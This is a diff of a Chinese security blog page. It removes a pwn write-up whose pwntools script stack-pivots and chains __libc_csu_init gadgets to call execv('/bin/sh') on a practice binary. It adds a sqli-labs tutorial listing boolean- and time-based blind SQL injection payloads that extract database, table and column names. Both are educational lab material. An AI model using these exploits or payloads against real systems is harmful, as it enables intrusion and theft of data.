@@ -4,7 +4,7 @@
 
 <head>
     <meta charset="utf-8">
-    <meta name="keywords" content="栈转移原理与通用garget的使用, 矢坕个人博客">
+    <meta name="keywords" content="布尔盲注与时间盲注, 矢坕个人博客">
     <meta name="description" content="">
     <meta http-equiv="X-UA-Compatible" content="IE=edge">
     <meta name="viewport" content="width=device-width, initial-scale=1.0, user-scalable=no">
@@ -16,7 +16,7 @@
     <!-- Global site tag (gtag.js) - Google Analytics -->
 
 
-    <title>栈转移原理与通用garget的使用 | 矢坕个人博客</title>
+    <title>布尔盲注与时间盲注 | 矢坕个人博客</title>
     <link rel="icon" type="image/png" href="/favicon.png">
 
     <link rel="stylesheet" type="text/css" href="/libs/awesome/css/all.css">
@@ -310,12 +310,12 @@
 
 
 
-<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/9.jpg')">
+<div class="bg-cover pd-header post-cover" style="background-image: url('/medias/featureimages/19.jpg')">
     <div class="container" style="right: 0px;left: 0px;">
         <div class="row">
             <div class="col s12 m12 l12">
                 <div class="brand">
-                    <h1 class="description center-align post-title">栈转移原理与通用garget的使用</h1>
+                    <h1 class="description center-align post-title">布尔盲注与时间盲注</h1>
                 </div>
             </div>
         </div>
@@ -431,8 +431,8 @@
                     
                     <div class="article-tag">
                         
-                            <a href="/tags/pwn%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3-pwn-write-up/">
-                                <span class="chip bg-color">pwn原理讲解 pwn_write_up</span>
+                            <a href="/tags/web%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                                <span class="chip bg-color">web原理讲解</span>
                             </a>
                         
                     </div>
@@ -447,21 +447,21 @@
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-minus fa-fw"></i>发布日期:&nbsp;&nbsp;
-                    2022-12-28
+                    2023-03-29
                 </div>
                 
 
                 
                 <div class="post-date info-break-policy">
                     <i class="far fa-calendar-check fa-fw"></i>更新日期:&nbsp;&nbsp;
-                    2023-01-08
+                    2023-03-29
                 </div>
                 
 
                 
                 <div class="info-break-policy">
                     <i class="far fa-file-word fa-fw"></i>文章字数:&nbsp;&nbsp;
-                    605
+                    604
                 </div>
                 
 
@@ -486,33 +486,21 @@
 
         <div class="card-content article-card-content">
             <div id="articleContent">
-                <h1 id="栈转移原理与通用rop的使用"><a href="#栈转移原理与通用rop的使用" class="headerlink" title="栈转移原理与通用rop的使用"></a>栈转移原理与通用rop的使用</h1><p>此题下载链接：<br><a href="/download/advanced">点击下载</a><br>这里我们通过一题pwn题边解边说：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/1.png"><br>可以看到，这题讲解示范没有开任何保护。<br>拖入ida查看：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/2.png"><br>虽然打印出来了execv的地址和system的地址，但不知道为什么和~~ 实际差挺多的  ~~……如下：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/3.png"><br>查看vul函数发现有溢出点但是字节有限只能溢出24个字节，而此题没有现成的system或execv函数可用，直接溢出并不现实<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/4.png"></p>
-<h3 id="栈转移原理"><a href="#栈转移原理" class="headerlink" title="栈转移原理"></a>栈转移原理</h3><p>现在介绍一个新的方法：<strong>栈转移</strong><br>当碰到这种题目时，因为溢出字节不够，要转移到别的栈段上运行已准备好的rop<br>栈是由rbp和rsp决定的，尤其是后者rsp在哪，栈就在哪。因此，我们只需要想办法把rsp指针转移到我们需要的地方即可。而想要改变rsp的值，可以先通过改变rbp的值，再把rbp的值传递给rsp就可以达到栈转移到目的。<br>实际方法用leave ret指令可以做到<br>我们知道leave指令相当于</p>
-<pre class="line-numbers language-none"><code class="language-none">move rsp, rbp
-pop  rbp<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre>
-<p>ret指令相当于：</p>
-<pre class="line-numbers language-none"><code class="language-none">pop rip<span aria-hidden="true" class="line-numbers-rows"><span></span></span></code></pre>
-<p>因此将rbp的值先覆盖成目标地址，利用函数自带的leave指令先将rbp控制，接下另一段leave ret的garget的地址就可以实现rsp的控制实现栈转移，至于转移后rbp的值并不重要<br>leave;ret;地址：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/5.png"></p>
-<h3 id="通用garget原理"><a href="#通用garget原理" class="headerlink" title="通用garget原理"></a>通用garget原理</h3><p>已经把栈转移到了grobe_buf去了，接下来设置该区域的rop链，我们用通用garget<br>我们点开_libc_csu_init这个函数<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/7.png"><br>可以发现这里的garget是不是很齐全，只要调用了这里几乎哪里都能call，这里分为两个garget分别记下地址<br>这里说一下怎么查看execv函数got表地址：<br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/9.png"><br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/10.png"><br>接下来上exp：</p>
-<pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> pwn <span class="token keyword">import</span><span class="token operator">*</span>
-io<span class="token operator">=</span>process<span class="token punctuation">(</span><span class="token string">'./advanced'</span><span class="token punctuation">)</span>
-payload1<span class="token operator">=</span><span class="token string">b'a'</span><span class="token operator">*</span><span class="token number">80</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x404080</span><span class="token punctuation">)</span><span class="token operator">+</span>p64<span class="token punctuation">(</span><span class="token number">0x4011fb</span><span class="token punctuation">)</span><span class="token comment">#leave ret的地址</span>
-payload2<span class="token operator">=</span><span class="token string">b'/bin/sh\x00'</span><span class="token comment">#将/bin/sh\x00输入grobe_buf中</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x40133a</span><span class="token punctuation">)</span><span class="token comment">#通用garget pop部分</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#rbx</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">1</span><span class="token punctuation">)</span><span class="token comment">#rbp</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x404080</span><span class="token punctuation">)</span><span class="token comment">#将/bin/sh的地址给r12，r12后会给rdi</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#r13</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span><span class="token comment">#r14 这两个值看调用函数原型的要求来定</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x403ff8</span><span class="token punctuation">)</span><span class="token comment">#execv函数在got表的真实地址</span>
-payload2<span class="token operator">+=</span>p64<span class="token punctuation">(</span><span class="token number">0x401320</span><span class="token punctuation">)</span><span class="token comment">#通用garget call部分</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'global:'</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload2<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>recvuntil<span class="token punctuation">(</span><span class="token string">'input:'</span><span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>sendline<span class="token punctuation">(</span>payload1<span class="token punctuation">)</span>
-io<span class="token punctuation">.</span>interactive<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre>
-
-<p>结束战斗：<del>（由于是本地做题没有flag）</del><br><img src="/images/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/11.png"></p>
+                <h1 id="sqli-labs-less-8-9"><a href="#sqli-labs-less-8-9" class="headerlink" title="sqli-labs less-8~9"></a>sqli-labs less-8~9</h1><hr>
+<h2 id="布尔盲注："><a href="#布尔盲注：" class="headerlink" title="布尔盲注："></a>布尔盲注：</h2><hr>
+<p>概念：布尔盲注一般适用于页面没有回显字段(不支持联合查询)，且web页面返回True 或者 false，构造SQL语句，利用and，or等关键字来其后的语句 true 、 false使web页面返回true或者false，从而达到注入的目的来获取信息。<br>布尔盲注我们要用到几个函数：</p>
+<ul>
+<li>substr(str，字符串开始位置，字符串截取个数)</li>
+<li>left(str，从左往右的截取个数)</li>
+<li>right(str，从右往左的截取个数)</li>
+<li>ascii()将str转换为ascll码</li>
+<li>length()返回str长度<br>这里只提到一下这个方法，具体应用等到会写脚本时会具体讲解<br>下面是less-8的一些解题代码：<br>查看库名长度：<br><code>?id=1&#39; and length(database())&gt;0</code><br>爆破库名：<br><code>?id=1&#39; and left(database(),1)&gt;&#39;m&#39; –+</code><br>一个一个尝试得到security<br>爆破表名：<br><code>?id=1&#39; and ascii(substr((select table_name from information_schema.tables where table_schema=&#39;security&#39; limit 0,1),1,1))&gt;97 –+</code><br>爆破列名：<br><code>?id=1&#39; and left((select column_name from information_schema.columns where table_name=&#39;emails&#39; limit 0,1),1)&gt;&#39;m&#39; –+</code><br>拆解字段：<br><code>?id=1&#39;and ascii((select id from emails limit 0,1))&gt;0 –+</code></li>
+</ul>
+<h2 id="时间盲注"><a href="#时间盲注" class="headerlink" title="时间盲注"></a>时间盲注</h2><p>概念：时间盲注：适用于页面不会随着输入语句的不同而发生变化，只会回显一种界面。利用sleep()或benchmark()等函数让mysql执行时间变长经常与if(expr1,expr2,expr3)语句结合使用，通过页面的响应时间来判断条件是否正确。if(expr1,expr2,expr3)含义是如果expr1是True,则返回expr2,否则返回expr3。<br>函数：</p>
+<ul>
+<li>sleep(int)过int后响应</li>
+<li>if(expr1,expr2,expr3)expr1是true，则返回expr2，或者返回expr3<br>为了更准确的看秒数我们可以开bp也可以如下操作：<br>1、右击黑色处选择检查<br>2、选择网络即可查看秒数<br><img src="/images/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%B8%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/1.png"><br>要用时间盲注的题目一般关闭了报错和回显，没有任何有用的信息，这时只能通过时间来判断<br>以下给出部分做题代码：<br>判断闭合类型：<br><code>?id=1 and sleep(2)--+</code><br>发现加载时间没有2秒<br><code>?id=1&#39; and sleep(2)--+</code><br>发现有延迟2秒，判断为’闭合<br>接下来爆破库名：<br><code>?id=1 and if(left(database(),1)=&#39;s&#39;,sleep(2),1)--+</code><br>接下来将left(database(),1)&#x3D;’s’给换成其他语句就行了，就不一一例举了</li>
+</ul>
 
                 
             </div>
@@ -539,7 +527,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </i>
                 </span>
                 <span class="reprint-info">
-                    <a href="http://airunfive.github.io/2022/12/28/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/">http://airunfive.github.io/2022/12/28/%E6%A0%88%E8%BD%AC%E7%A7%BB%E5%8E%9F%E7%90%86%E4%B8%8E%E9%80%9A%E7%94%A8rop%E7%9A%84%E4%BD%BF%E7%94%A8/</a>
+                    <a href="http://airunfive.github.io/2023/03/29/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%B8%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">http://airunfive.github.io/2023/03/29/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%B8%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/</a>
                 </span>
             </div>
             <div class="reprint__notice">
@@ -577,8 +565,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     
                         <div class="article-tag">
                             
-                                <a href="/tags/pwn%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3-pwn-write-up/">
-                                    <span class="chip bg-color">pwn原理讲解 pwn_write_up</span>
+                                <a href="/tags/web%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                                    <span class="chip bg-color">web原理讲解</span>
                                 </a>
                             
                         </div>
@@ -748,17 +736,18 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
 <article id="prenext-posts" class="prev-next articles">
     <div class="row article-row">
         
-        <div class="article col s12 m6" data-aos="fade-up">
+        <div class="article col s12 m6" data-aos="fade-up" data-aos="fade-up">
             <div class="article-badge left-badge text-color">
-                <i class="fas fa-chevron-left"></i>&nbsp;上一篇</div>
+                <i class="far fa-dot-circle"></i>&nbsp;本篇
+            </div>
             <div class="card">
-                <a href="/2022/12/28/guess-num/">
+                <a href="/2023/03/29/%E5%B8%83%E5%B0%94%E7%9B%B2%E6%B3%A8%E4%B8%8E%E6%97%B6%E9%97%B4%E7%9B%B2%E6%B3%A8/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/2.jpg" class="responsive-img" alt="guess_num">
+                        <img src="/medias/featureimages/19.jpg" class="responsive-img" alt="布尔盲注与时间盲注">
                         
-                        <span class="card-title">guess_num</span>
+                        <span class="card-title">布尔盲注与时间盲注</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -768,9 +757,9 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         
                     </div>
                     <div class="publish-info">
-                        <span class="publish-date">
-                            <i class="far fa-clock fa-fw icon-date"></i>2022-12-28
-                        </span>
+                            <span class="publish-date">
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-29
+                            </span>
                         <span class="publish-author">
                             
                             <i class="fas fa-user fa-fw"></i>
@@ -779,11 +768,12 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                         </span>
                     </div>
                 </div>
+
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn-write-up/">
-                        <span class="chip bg-color">pwn-write-up</span>
+                    <a href="/tags/web%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                        <span class="chip bg-color">web原理讲解</span>
                     </a>
                     
                 </div>
@@ -797,13 +787,13 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 下一篇&nbsp;<i class="fas fa-chevron-right"></i>
             </div>
             <div class="card">
-                <a href="/2022/12/27/CGfsb-wp/">
+                <a href="/2023/03/28/sqli-labs-5-7/">
                     <div class="card-image">
                         
                         
-                        <img src="/medias/featureimages/17.jpg" class="responsive-img" alt="CGfsb_wp">
+                        <img src="/medias/featureimages/9.jpg" class="responsive-img" alt="sqli-labs-5~7">
                         
-                        <span class="card-title">CGfsb_wp</span>
+                        <span class="card-title">sqli-labs-5~7</span>
                     </div>
                 </a>
                 <div class="card-content article-content">
@@ -814,7 +804,7 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                     </div>
                     <div class="publish-info">
                             <span class="publish-date">
-                                <i class="far fa-clock fa-fw icon-date"></i>2022-12-27
+                                <i class="far fa-clock fa-fw icon-date"></i>2023-03-28
                             </span>
                         <span class="publish-author">
                             
@@ -827,8 +817,8 @@ io<span class="token punctuation">.</span>interactive<span class="token punctuat
                 
                 <div class="card-action article-tags">
                     
-                    <a href="/tags/pwn-write-up/">
-                        <span class="chip bg-color">pwn-write-up</span>
+                    <a href="/tags/web%E5%8E%9F%E7%90%86%E8%AE%B2%E8%A7%A3/">
+                        <span class="chip bg-color">web原理讲解</span>
                     </a>
                     
                 </div>
